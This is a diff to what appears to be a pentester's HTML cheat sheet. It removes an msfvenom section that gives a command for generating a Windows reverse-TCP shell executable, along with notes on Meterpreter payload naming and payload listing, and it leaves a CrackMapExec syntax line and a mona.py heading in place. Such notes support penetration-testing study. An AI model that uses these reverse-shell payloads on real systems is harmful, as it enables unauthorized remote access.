@@ -58,31 +58,6 @@
 cme &lt;service&gt; &lt;target_IP&gt; <span class="nt">-d</span> &lt;domain&gt; <span class="nt">-u</span> <span class="s1">'&lt;user&gt;'</span> <span class="nt">-p</span> <span class="s1">'&lt;pass&gt;'</span> <span class="nt">--</span>&lt;action&gt;
 </code></pre></div>
 
-<h2>msfvenom</h2>
-
-<h3>example syntax</h3>
-
-<ul>
-<li><code>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-ip&gt; LPORT=&lt;listen-port&gt;</code></li>
-</ul>
-
-<h3>meterpreter payload naming convention</h3>
-
-<ul>
-<li>general naming convention is <code>&lt;OS&gt;/&lt;arch&gt;/&lt;payload&gt;</code></li>
-<li>for instance <code>linux/x86/shell_reverse_tcp</code></li>
-<li>however, windows 32bit targets have no specified arch, like so: <code>windows/shell_reverse_tcp</code></li>
-<li>staged payloads are denoted by a slash: <code>windows/x64/meterpreter/reverse_tcp</code></li>
-<li>stageless payloads are denoted by an underscore: <code>linux/x86/meterpreter_reverse_tcp</code></li>
-</ul>
-
-<h3>listing payloads</h3>
-
-<ul>
-<li><code>msfvenom --list payloads</code></li>
-<li>grep the output for specific results, like <code>msfvenom --list payloads | grep &quot;linux/x86/meterpreter&quot;</code></li>
-</ul>
-
 <h2>mona.py</h2>
 
 <h3>main commands for BOFs with immunity debugger</h3>
